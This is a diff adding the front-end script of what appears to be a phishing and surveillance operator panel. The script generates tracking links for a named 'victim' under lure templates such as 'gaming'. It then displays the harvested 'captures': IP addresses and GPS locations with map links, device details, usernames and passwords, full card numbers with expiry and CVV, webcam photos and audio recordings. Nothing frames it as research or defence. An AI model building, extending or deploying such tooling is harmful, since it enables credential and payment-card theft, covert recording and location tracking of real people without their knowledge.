+    const res=await fetch('/api/generate-link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({template:selectedTemplate,victim_name:victimName,custom_dp:customDP,title:selectedTemplate.charAt(0).toUpperCase()+selectedTemplate.slice(1)})});
+    const data=await res.json();
+    if(data.success){
+      document.getElementById('genTemplateTag').textContent=selectedTemplate.toUpperCase();
+      document.getElementById('genLinkUrl').value=data.link.tracking_url;
+      document.getElementById('generatedLink').style.display='block';
+    }
+  }catch(err){alert('Failed to generate link');}
+}
+
+function copyGeneratedLink(){
+  const input=document.getElementById('genLinkUrl');
+  input.select();
+  document.execCommand('copy');
+  const btn=input.nextElementSibling;
+  btn.innerHTML='<i class="fas fa-check"></i> COPIED!';
+  setTimeout(()=>btn.innerHTML='<i class="fas fa-copy"></i> Copy Link',1500);
+}
+
+async function loadStats(){
+  try{
+    const res=await fetch('/api/stats');
+    const data=await res.json();
+    if(data.success){
+      const s=data.stats;
+      document.getElementById('statPhotos').textContent=s.total_photos;
+      document.getElementById('statCreds').textContent=s.total_creds;
+      document.getElementById('statAudio').textContent=s.total_audio;
+      document.getElementById('statTotal').textContent=s.total_captures;
+      document.getElementById('statGPS').textContent=s.total_captures;
+      document.getElementById('statContacts').textContent=s.total_captures;
+      document.getElementById('statWiFi').textContent=s.total_captures;
+      document.getElementById('statUsers').textContent=s.total_captures;
+      document.getElementById('captureBadge').textContent=s.total_captures;
+    }
+  }catch(err){}
+}
+
+async function loadRecentCaptures(){
+  try{
+    const res=await fetch('/api/captures');
+    const data=await res.json();
+    if(data.success&&data.captures.length>0){
+      document.getElementById('recentCaptures').innerHTML=data.captures.slice(0,3).map(cap=>renderCaptureCard(cap)).join('');
+    }
+  }catch(err){}
+}
+
+async function loadCaptures(){
+  try{
+    const res=await fetch('/api/captures');
+    const data=await res.json();
+    if(data.success){
+      const container=document.getElementById('capturesList');
+      if(data.captures.length===0){
+        container.innerHTML='<div style="text-align:center;padding:60px;color:var(--text-dim)"><i class="fas fa-camera" style="font-size:45px;margin-bottom:15px;display:block;opacity:0.3"></i>No captures yet</div>';
+      }else{
+        container.innerHTML=data.captures.map(cap=>renderCaptureCard(cap)).join('');
+      }
+      document.getElementById('captureBadge').textContent=data.captures.length;
+    }
+  }catch(err){}
+}
+
+function renderCaptureCard(cap){
+  const dt=new Date(cap.timestamp).toLocaleString([],{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+
+  // FIXED: Better location handling for Google Maps
+  let loc = 'Unknown';
+  let hasGPS = false;
+  let lat = null, lng = null;
+
+  // Check for GPS coordinates first
+  if (cap.location?.gps_lat && cap.location?.gps_lng) {
+    lat = cap.location.gps_lat;
+    lng = cap.location.gps_lng;
+    hasGPS = true;
+    loc = `${cap.location.city || 'Unknown'}, ${cap.location.country || ''}`;
+    if (cap.location.org) loc += ` | ${cap.location.org}`;
+  } else if (cap.location?.latitude && cap.location?.longitude) {
+    lat = cap.location.latitude;
+    lng = cap.location.longitude;
+    hasGPS = true;
+    loc = `${cap.location.city || 'Unknown'}, ${cap.location.country || ''}`;
+    if (cap.location.org) loc += ` | ${cap.location.org}`;
+  } else if (cap.location?.city) {
+    loc = `${cap.location.city}, ${cap.location.country || ''}`;
+    if (cap.location.org) loc += ` | ${cap.location.org}`;
+  } else if (cap.location?.ip) {
+    loc = cap.location.ip;
+    if (cap.location.org) loc += ` | ${cap.location.org}`;
+  }
+
+  const device=`${cap.device_info?.platform || 'Unknown'} | ${cap.device_info?.browser || 'Unknown'}`;
+  const hasCreds=cap.credentials?true:false;
+  const hasAudio=cap.audio?true:false;
+  const hasPhotos=(cap.photos&&cap.photos.length>0)?true:false;
+  const photoCount=cap.photos?cap.photos.length:0;
+
+  let tags=`<span class="capture-tag tag-purple">${cap.template || 'Unknown'}</span>`;
+  if(hasCreds) tags+=`<span class="capture-tag tag-green">Creds</span>`;
+  if(hasAudio) tags+=`<span class="capture-tag tag-red">Audio</span>`;
+  if(hasPhotos) tags+=`<span class="capture-tag tag-blue">${photoCount} Photos</span>`;
+
+  let photosHtml='';
+  if(hasPhotos){
+    const photosJson=JSON.stringify(cap.photos).replace(/"/g,'&quot;');
+    photosHtml=`<div class="capture-photos">${cap.photos.slice(0,5).map((p,i)=>`<img class="photo-thumb" src="${p}" onclick="openLightbox(${photosJson},${i})">`).join('')}</div>`;
+  }
+
+  let audioHtml='';
+  if(hasAudio){
+    audioHtml=`<div class="capture-audio"><audio controls src="${cap.audio}"></audio></div>`;
+  }
+
+  let credsHtml='';
+  if(hasCreds){
+    if (cap.credentials.card_number) {
+      credsHtml=`<div class="capture-creds">💳 Card: ${cap.credentials.card_number||''} | Exp: ${cap.credentials.expiry||''} | CVV: ${cap.credentials.cvv||''}</div>`;
+    } else {
+      credsHtml=`<div class="capture-creds">🔒 ${cap.credentials.username||cap.credentials.email||''} | ${cap.credentials.password||''}</div>`;
+    }
+  }
+
+  // FIXED: Google Maps button - always show if we have coordinates
+  let mapBtn='';
+  if(hasGPS && lat && lng){
+    mapBtn=`<a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" class="map-btn"><i class="fas fa-map-marker-alt"></i> View on Google Maps</a>`;
+  }
+
+  return `
+  <div class="capture-card">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+      <div class="capture-tags">${tags}</div>
+      <span style="color:var(--text-faint);font-size:11px">${dt}</span>
+    </div>
+    <div class="capture-ip">🌐 ${cap.ip}</div>
+    <div class="capture-location">📍 ${loc}</div>
+    <div class="capture-device">💻 ${device}</div>
+    ${credsHtml}
+    ${photosHtml}
+    ${audioHtml}
+    ${mapBtn}
+  </div>
+  `;
+}
+
+// Lightbox functions
+function openLightbox(photos, index) {
+  currentLightboxPhotos = photos;
+  currentLightboxIndex = index;
+  updateLightbox();
+  document.getElementById('lightboxOverlay').classList.add('active');
+}
+
+function updateLightbox() {
+  const img = document.getElementById('lightboxImg');
+  const counter = document.getElementById('lightboxCounter');
+  const download = document.getElementById('lightboxDownload');
+  img.src = currentLightboxPhotos[currentLightboxIndex];
+  counter.textContent = `${currentLightboxIndex + 1} / ${currentLightboxPhotos.length}`;
+  download.href = currentLightboxPhotos[currentLightboxIndex];
+}
+
+function closeLightbox(e) {
+  if (e.target.id === 'lightboxOverlay') {
+    document.getElementById('lightboxOverlay').classList.remove('active');
+  }
+}
+
+function closeLightboxBtn() {
+  document.getElementById('lightboxOverlay').classList.remove('active');
+}
+
+// Keyboard navigation for lightbox
+document.addEventListener('keydown', function(e) {
+  const overlay = document.getElementById('lightboxOverlay');
+  if (!overlay.classList.contains('active')) return;
+  if (e.key === 'Escape') closeLightboxBtn();
+  if (e.key === 'ArrowLeft' && currentLightboxIndex > 0) {
+    currentLightboxIndex--;
+    updateLightbox();
+  }
+  if (e.key === 'ArrowRight' && currentLightboxIndex < currentLightboxPhotos.length - 1) {
+    currentLightboxIndex++;
+    updateLightbox();
+  }
+});
+
+async function clearCaptures(){
+  if(!confirm('Clear all captures?'))return;
+  try{
+    const res=await fetch('/api/clear-captures',{method:'POST'});
+    const data=await res.json();
+    if(data.success){loadCaptures();loadStats();}
+  }catch(err){}
+}
+
+async function logout(){
+  try{await fetch('/api/logout',{method:'POST'});}catch(e){}
+  window.location.href='/login';
+}
+
+setInterval(()=>{
+  if(document.getElementById('dashboardSection').style.display!=='none'){loadStats();loadRecentCaptures();}
+  if(document.getElementById('capturesSection').style.display!=='none')loadCaptures();
+},10000);
+
+document.querySelector('[data-template="gaming"]')?.classList.add('selected');
+
+init();
+</script>
+</body>
+</html>
